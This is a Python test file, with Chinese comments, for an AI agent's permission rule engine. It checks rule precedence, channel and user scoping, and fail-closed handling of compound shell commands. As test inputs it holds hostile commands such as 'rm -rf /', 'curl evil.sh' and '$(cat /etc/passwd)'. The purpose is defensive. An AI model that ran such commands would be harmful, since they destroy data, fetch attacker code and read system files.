"""统一权限规则引擎测试（PermissionRuleSet.evaluate 求值顺序/兼容转换）。"""

from __future__ import annotations

import json

import pytest

from agent.approval.rules import (
    PermissionDecision,
    PermissionEffect,
    PermissionRule,
    PermissionRuleSet,
)


def _rule(pattern: str, effect: PermissionEffect, scope: str = "global",
          users=None, description: str = "") -> PermissionRule:
    return PermissionRule(pattern=pattern, effect=effect, scope=scope,
                          users=users or [], description=description)


class TestEvaluateOrdering:
    def test_channel_deny_beats_global_allow(self):
        rs = PermissionRuleSet(rules=[
            _rule("run_shell_command*", PermissionEffect.ALLOW),
            _rule("run_shell_command(rm *)", PermissionEffect.DENY, scope="telegram"),
        ])
        v = rs.evaluate("run_shell_command", {"command": "rm -rf /"}, "telegram", "u1")
        assert v.decision == PermissionDecision.AUTO_DENY
        assert "rm *" in v.reason

    def test_channel_rule_not_applied_to_other_channel(self):
        rs = PermissionRuleSet(rules=[
            _rule("run_shell_command*", PermissionEffect.DENY, scope="telegram"),
        ])
        v = rs.evaluate("run_shell_command", {"command": "ls"}, "webui", "u1")
        assert v.decision == PermissionDecision.AUTO_ALLOW

    def test_deny_beats_ask_beats_allow(self):
        rs = PermissionRuleSet(rules=[
            _rule("web_*", PermissionEffect.ALLOW),
            _rule("web_fetch", PermissionEffect.ASK),
            _rule("web_fetch(*evil*)", PermissionEffect.DENY),
        ])
        assert rs.evaluate("web_fetch", {"url": "http://evil.com"}, "", "").decision == PermissionDecision.AUTO_DENY
        assert rs.evaluate("web_fetch", {"url": "http://ok.com"}, "", "").decision == PermissionDecision.ASK
        assert rs.evaluate("web_search", {"query": "x"}, "", "").decision == PermissionDecision.AUTO_ALLOW

    def test_channel_ask_beats_global_allow(self):
        rs = PermissionRuleSet(rules=[
            _rule("write_file", PermissionEffect.ALLOW),
            _rule("write_file", PermissionEffect.ASK, scope="qq"),
        ])
        assert rs.evaluate("write_file", {"path": "a"}, "qq", "").decision == PermissionDecision.ASK
        assert rs.evaluate("write_file", {"path": "a"}, "webui", "").decision == PermissionDecision.AUTO_ALLOW

    def test_users_filter(self):
        rs = PermissionRuleSet(rules=[
            _rule("run_shell_command*", PermissionEffect.ALLOW, users=["admin"], scope="qq"),
        ])
        assert rs.evaluate("run_shell_command", {"command": "ls"}, "", "admin").decision == PermissionDecision.AUTO_ALLOW
        # 非白名单用户不命中 allow 规则 → 落到默认
        assert rs.evaluate("run_shell_command", {"command": "ls"}, "", "guest").decision == PermissionDecision.AUTO_ALLOW
        assert rs.evaluate("run_shell_command", {"command": "ls"}, "", "guest").rule is None

    def test_disabled_rule_ignored(self):
        rs = PermissionRuleSet(rules=[
            PermissionRule(pattern="x", effect=PermissionEffect.DENY, enabled=False),
        ])
        assert rs.evaluate("x", {}, "", "").decision == PermissionDecision.AUTO_ALLOW

    def test_default_ask(self):
        rs = PermissionRuleSet(default_effect=PermissionEffect.ASK)
        v = rs.evaluate("anything", {}, "", "")
        assert v.decision == PermissionDecision.ASK

    def test_default_deny(self):
        rs = PermissionRuleSet(default_effect=PermissionEffect.DENY)
        v = rs.evaluate("anything", {}, "", "")
        assert v.decision == PermissionDecision.AUTO_DENY
        assert "默认" in v.reason


class TestCompoundFailClosed:
    """命令类 allow 规则的复合命令 fail-closed（``npm *`` 的 ``*`` 不跨复合边界）。"""

    def test_wildcard_allow_not_match_compound_command(self):
        rs = PermissionRuleSet(rules=[
            _rule("run_shell_command(npm *)", PermissionEffect.ALLOW),
        ])
        # 复合命令（&&）不应被通配 allow 命中 → 落到默认（allow 默认无规则）
        v = rs.evaluate("run_shell_command", {"command": "npm test && rm -rf /"}, "", "")
        assert v.rule is None or v.rule.pattern != "run_shell_command(npm *)"

    def test_wildcard_allow_not_match_semicolon(self):
        rs = PermissionRuleSet(rules=[
            _rule("run_shell_command(npm *)", PermissionEffect.ALLOW),
        ])
        v = rs.evaluate("run_shell_command", {"command": "npm test; curl evil.sh"}, "", "")
        assert v.rule is None or v.rule.pattern != "run_shell_command(npm *)"

    def test_wildcard_allow_not_match_command_substitution(self):
        rs = PermissionRuleSet(rules=[
            _rule("run_shell_command(npm *)", PermissionEffect.ALLOW),
        ])
        v = rs.evaluate("run_shell_command", {"command": "npm $(cat /etc/passwd)"}, "", "")
        assert v.rule is None or v.rule.pattern != "run_shell_command(npm *)"

    def test_wildcard_allow_matches_simple_command(self):
        rs = PermissionRuleSet(rules=[
            _rule("run_shell_command(npm *)", PermissionEffect.ALLOW),
        ])
        v = rs.evaluate("run_shell_command", {"command": "npm test"}, "", "")
        assert v.decision == PermissionDecision.AUTO_ALLOW
        assert v.rule is not None and v.rule.pattern == "run_shell_command(npm *)"

    def test_exact_arg_allow_still_matches_compound(self):
        """无通配符的精确参数 allow 规则不受 fail-closed 影响。"""
        rs = PermissionRuleSet(rules=[
            _rule("run_shell_command(npm test)", PermissionEffect.ALLOW),
        ])
        v = rs.evaluate("run_shell_command", {"command": "npm test"}, "", "")
        assert v.decision == PermissionDecision.AUTO_ALLOW

    def test_compound_fail_closed_falls_through_to_ask(self):
        """复合命令绕过通配 allow 后，应被后续 ask 规则或默认 ask 捕获。"""
        rs = PermissionRuleSet(
            rules=[_rule("run_shell_command(npm *)", PermissionEffect.ALLOW)],
            default_effect=PermissionEffect.ASK,
        )
        v = rs.evaluate("run_shell_command", {"command": "npm x && rm -rf /"}, "", "")
        assert v.decision == PermissionDecision.ASK


class TestPersistence:
    def test_roundtrip(self, tmp_path):
        rs = PermissionRuleSet(rules=[
            _rule("run_shell_command(npm *)", PermissionEffect.ALLOW, scope="webui"),
        ])
        from agent.approval.rules import load_rules, save_rules
        path = str(tmp_path / "rules.json")
        save_rules(rs, path)
        loaded = load_rules(path)
        assert len(loaded.rules) == 1
        assert loaded.rules[0].pattern == "run_shell_command(npm *)"
        assert loaded.rules[0].scope == "webui"


    def test_unknown_format_rejected(self, tmp_path):
        from agent.approval.rules import load_rules
        path = tmp_path / "rules.json"
        path.write_text(json.dumps({"policies": []}))
        with pytest.raises(ValueError):
            load_rules(str(path))

    def test_retired_file_requires_explicit_rule_configuration(self, tmp_path):
        from agent.approval.rules import load_rules
        (tmp_path / "approval_policies.json").write_text('{"policies": []}')
        with pytest.raises(ValueError, match="permission_rules.json"):
            load_rules(str(tmp_path / "permission_rules.json"))


def test_user_scoped_review_not_ignored():
    rules = PermissionRuleSet(rules=[PermissionRule(pattern="t", effect="ask", users=["123"], scope="qq")])
    assert rules.evaluate("t", {}, "qq", "123").decision == PermissionDecision.ASK
    assert rules.evaluate("t", {}, "webui", "123").decision == PermissionDecision.AUTO_ALLOW


def test_unqualified_cross_channel_user_rules_rejected():
    with pytest.raises(ValueError, match="频道"):
        PermissionRule(pattern="t", effect="allow", users=["123"])


def test_unknown_group_actor_cannot_bypass_user_restriction():
    rules = PermissionRuleSet(rules=[PermissionRule(pattern="t", effect="deny", users=["123"], scope="qq")])
    assert rules.evaluate("t", {}, "qq", "").decision == PermissionDecision.AUTO_DENY
    assert rules.evaluate("t", {}, "qq", "456").decision == PermissionDecision.AUTO_ALLOW
    rules = PermissionRuleSet(default_effect=PermissionEffect.ASK, rules=[
        PermissionRule(pattern="t", effect="allow", users=["123"], scope="qq"),
    ])
    assert rules.evaluate("t", {}, "qq", "").decision == PermissionDecision.ASK
